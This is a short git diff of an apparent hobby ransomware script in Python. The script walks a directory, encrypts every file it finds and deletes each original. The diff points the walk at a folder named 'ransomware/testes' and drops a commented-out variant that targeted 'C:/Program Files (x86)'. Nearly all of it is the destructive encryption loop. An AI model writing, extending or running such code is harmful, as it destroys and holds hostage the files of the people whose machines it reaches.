@@ -16,16 +16,9 @@ def encrypt(file_path):
         file.write(encrypted_data)
         os.remove(file_path)
 
-system = os.walk("C:/Users/Kali/Desktop/Jobs/PythonFunc/testes")
+system = os.walk("C:/Users/Kali/Desktop/ransomware/testes")
 for root, dirs, files in system:
     for file in files:
         file_path = os.path.join(root, file)
         encrypt(file_path)
         print(f"[+] Encrypting {file_path}")
-
-## system = os.walk("C:/Program Files (x86)")
-## for root, dirs, files in system:
-##    for file in files:
-##        file_path = os.path.join(root, file)
-##        encrypt(file_path)
-##        print(f"[+] Encrypting {file_path}")
